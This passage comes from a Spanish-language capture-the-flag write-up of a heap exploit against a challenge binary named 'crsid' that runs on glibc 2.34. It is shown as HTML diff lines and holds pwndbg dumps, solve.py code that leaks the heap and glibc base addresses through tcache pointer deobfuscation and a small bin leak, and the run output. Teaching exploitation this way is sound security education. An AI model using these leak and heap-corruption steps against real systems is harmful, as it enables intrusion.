+<span class="code-dark-magenta">    0x7fb2c7215000     0x7fb2c7217000 rw-p     2000 30000  ./glibc/ld-2.34.so</span>
+<span class="code-dark-yellow">    0x7ffdf29cb000     0x7ffdf29ec000 rw-p    21000 0      [stack]</span>
+    0x7ffdf29f3000     0x7ffdf29f7000 r--p     4000 0      [vvar]
+<span class="code-dark-red">    0x7ffdf29f7000     0x7ffdf29f9000 r-xp     2000 0      [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span>
+<span class="code-red">pwndbg&gt; </span>x/30gx 0x5594e6cb4000
+<span class="code-dark-blue">0x5594e6cb4000</span>: 0x0000000000000000      0x00005594e6cb4008
+<span class="code-dark-blue">0x5594e6cb4010</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4020</span> &lt;<span class="code-dark-yellow">stdout</span>&gt;:        0x00007fb2c71d3760      0x0000000000000000  
+<span class="code-dark-blue">0x5594e6cb4030</span> &lt;<span class="code-dark-yellow">stdin</span>&gt;: 0x00007fb2c71d2a80      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4040</span> &lt;<span class="code-dark-yellow">stderr</span>&gt;:        0x00007fb2c71d3680      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4050</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4060</span>: 0x00005594e7ebc2f0      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4070</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4080</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb4090</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb40a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb40b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb40c0</span>: 0x0000000a66647361      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb40d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5594e6cb40e0</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>El vector de <code>users</code> empieza en <code>0x5594e6cb4060</code>. Hay 12 huecos, y el siguiente corresponde a la variable global <code>crsid</code> (donde pusimos <code>asdf\n</code>, que es <code>0x0a66647361</code> en formato hexadecimal, <em>little-endian</em>).</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>En este punto, podemos fugar el puntero <code>fd</code> ofuscado y el puntero <code>fd</code> del <em>chunk</em> del <em>Small Bin</em> para calcular las direcciones base del <em>heap</em> y de Glibc, respectivamente. Este es el estado del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+
+0x5594e7ebc000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000291</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc010  <span class="code-dark-cyan">0x0006000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc040  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc050  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc060  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc070  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc080  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc090  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc0a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x00005594e7ebc340</span>      <span class="code-dark-cyan">........@....U..</span>
+0x5594e7ebc0b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc0c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc0d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc0e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc0f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc100  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc110  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc120  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc130  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc140  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc150  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc160  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc170  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc180  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc190  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1a0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc1f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc200  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc210  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc220  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc230  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc260  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc270  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc280  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc290  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000051</span>      <span class="code-dark-magenta">........Q.......</span>         &lt;-- smallbins[0x50][0]
+0x5594e7ebc2a0  <span class="code-dark-magenta">0x00007fb2c71d2d00</span>      <span class="code-dark-magenta">0x00007fb2c71d2d00</span>      <span class="code-dark-magenta">.-.......-......</span>
+0x5594e7ebc2b0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc2c0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc2d0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc2e0  <span class="code-dark-green">0x0000000000000050</span>      <span class="code-dark-green">0x0000000000000050</span>      <span class="code-dark-green">P.......P.......</span>
+0x5594e7ebc2f0  <span class="code-dark-green">0x00005591bea5bd00</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">.....U..........</span>
+0x5594e7ebc300  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc310  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc320  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc330  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000051</span>      <span class="code-dark-blue">........Q.......</span>
+0x5594e7ebc340  <span class="code-dark-blue">0x00005591bea5bd2c</span>      <span class="code-dark-blue">0x6685522b4639b16f</span>      <span class="code-dark-blue">,....U..o.9F+R.f</span>         &lt;-- tcachebins[0x50][0/6]
+0x5594e7ebc350  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc360  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc370  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc380  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000051</span>      <span class="code-dark-yellow">........Q.......</span>
+0x5594e7ebc390  <span class="code-dark-yellow">0x00005591bea5bd5c</span>      <span class="code-dark-yellow">0x6685522b4639b16f</span>      <span class="code-dark-yellow">\....U..o.9F+R.f</span>         &lt;-- tcachebins[0x50][1/6]
+0x5594e7ebc3a0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">................</span>
+0x5594e7ebc3b0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">................</span>
+0x5594e7ebc3c0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-yellow">................</span>
+0x5594e7ebc3d0  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000051</span>      <span class="code-dark-cyan">........Q.......</span>
+0x5594e7ebc3e0  <span class="code-dark-cyan">0x00005591bea5ba8c</span>      <span class="code-dark-cyan">0x6685522b4639b16f</span>      <span class="code-dark-cyan">.....U..o.9F+R.f</span>         &lt;-- tcachebins[0x50][2/6]
+0x5594e7ebc3f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc400  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc410  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x5594e7ebc420  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000051</span>      <span class="code-dark-magenta">........Q.......</span>
+0x5594e7ebc430  <span class="code-dark-magenta">0x00005591bea5ba3c</span>      <span class="code-dark-magenta">0x6685522b4639b16f</span>      <span class="code-dark-magenta">&lt;....U..o.9F+R.f</span>         &lt;-- tcachebins[0x50][3/6]  
+0x5594e7ebc440  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc450  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc460  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
+0x5594e7ebc470  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000051</span>      <span class="code-dark-green">........Q.......</span>
+0x5594e7ebc480  <span class="code-dark-green">0x00005591bea5ba6c</span>      <span class="code-dark-green">0x6685522b4639b16f</span>      <span class="code-dark-green">l....U..o.9F+R.f</span>         &lt;-- tcachebins[0x50][4/6]
+0x5594e7ebc490  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc4a0  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc4b0  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-green">................</span>
+0x5594e7ebc4c0  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000051</span>      <span class="code-dark-blue">........Q.......</span>
+0x5594e7ebc4d0  <span class="code-dark-blue">0x00000005594e7ebc</span>      <span class="code-dark-blue">0x6685522b4639b16f</span>      <span class="code-dark-blue">.~NY....o.9F+R.f</span>         &lt;-- tcachebins[0x50][5/6]
+0x5594e7ebc4e0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc4f0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc500  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-blue">................</span>
+0x5594e7ebc510  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000020af1</span>      <span class="code-dark-yellow">................</span>         &lt;-- Top chunk
+</code></pre></div><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>Primero, vamos a coger la dirección base del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">show</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">:].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
+
+<span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">deobfuscate</span><span class="mtk1">(</span><span class="mtk1">fd</span><span class="mtk1">) </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">8</span>
+
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 968613
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '968613', '-x', '/tmp/pwn0ajdf_fe.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-green">+</span>] Heap base address: 0x55a9f0608000
+[<span class="code-blue">*</span>] Switching to interactive mode
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 968613
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007fe28ae745ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x55a9ef27d0c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007fe28ae745ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fe28af67b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
+    0x55a9ef279000     0x55a9ef27a000 r--p     1000 0      ./crsid
+<span class="code-dark-red">    0x55a9ef27a000     0x55a9ef27b000 r-xp     1000 1000   ./crsid</span>
+    0x55a9ef27b000     0x55a9ef27c000 r--p     1000 2000   ./crsid
+    0x55a9ef27c000     0x55a9ef27d000 r--p     1000 2000   ./crsid
+<span class="code-dark-magenta">    0x55a9ef27d000     0x55a9ef27e000 rw-p     1000 3000   ./crsid</span>
+<span class="code-dark-blue">    0x55a9f0608000     0x55a9f0629000 rw-p    21000 0      [heap]</span>
+<span class="code-dark-magenta">    0x7fe28ad78000     0x7fe28ad7b000 rw-p     3000 0      [anon_7fe28ad78]</span>
+    0x7fe28ad7b000     0x7fe28ada7000 r--p    2c000 0      ./glibc/libc.so.6
+<span class="code-dark-red">    0x7fe28ada7000     0x7fe28af0e000 r-xp   167000 2c000  ./glibc/libc.so.6</span>
+    0x7fe28af0e000     0x7fe28af63000 r--p    55000 193000 ./glibc/libc.so.6
+    0x7fe28af63000     0x7fe28af64000 ---p     1000 1e8000 ./glibc/libc.so.6
+    0x7fe28af64000     0x7fe28af67000 r--p     3000 1e8000 ./glibc/libc.so.6
+<span class="code-dark-magenta">    0x7fe28af67000     0x7fe28af6a000 rw-p     3000 1eb000 ./glibc/libc.so.6</span>
+<span class="code-dark-magenta">    0x7fe28af6a000     0x7fe28af79000 rw-p     f000 0      [anon_7fe28af6a]</span>
+    0x7fe28af79000     0x7fe28af7a000 r--p     1000 0      ./glibc/ld-2.34.so  
+<span class="code-dark-red">    0x7fe28af7a000     0x7fe28af9e000 r-xp    24000 1000   ./glibc/ld-2.34.so</span>
+    0x7fe28af9e000     0x7fe28afa8000 r--p     a000 25000  ./glibc/ld-2.34.so
+    0x7fe28afa8000     0x7fe28afaa000 r--p     2000 2e000  ./glibc/ld-2.34.so
+<span class="code-dark-magenta">    0x7fe28afaa000     0x7fe28afac000 rw-p     2000 30000  ./glibc/ld-2.34.so</span>
+<span class="code-dark-yellow">    0x7ffe144aa000     0x7ffe144cb000 rw-p    21000 0      [stack]</span>
+    0x7ffe14521000     0x7ffe14525000 r--p     4000 0      [vvar]
+<span class="code-dark-red">    0x7ffe14525000     0x7ffe14527000 r-xp     2000 0      [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span>
+</code></pre></div><p>Todo parece correcto. Nótese que el índice <code>0</code> es el único <em>chunk</em> que hemos asignado (dirección base del <em>heap</em> más <code>0x2f0</code>), y tenemos que sobrescribir un byte nulo con otro carácter (por ejemplo una <code>A</code>) para poder mostrarlo (las <em>strings</em> en C terminan en byte nulo).</p><p>Una vez que tenemos esta dirección base del <em>heap</em>, podemos modificar el <code>crsid</code> para que apunte al <em>chunk</em> del <em>Small Bin</em> (dirección base del <em>heap</em> más <code>0x2a0</code>), de manera que podamos fugar Glibc de forma similar:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">change</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2a0</span><span class="mtk1">))</span>
+
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">12</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">main_arena_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">show</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">12</span><span class="mtk1">).</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">160</span>  
+
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">main_arena_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main_arena</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 977485
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '977485', '-x', '/tmp/pwnwu1c1ein.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-green">+</span>] Heap base address: 0x5569130e9000
+[<span class="code-green">+</span>] Glibc base address: 0x7f83f9b54000
+[<span class="code-blue">*</span>] Switching to interactive mode
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 977485
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007f83f9c4d5ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x5569116230c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007f83f9c4d5ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7f83f9d40b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
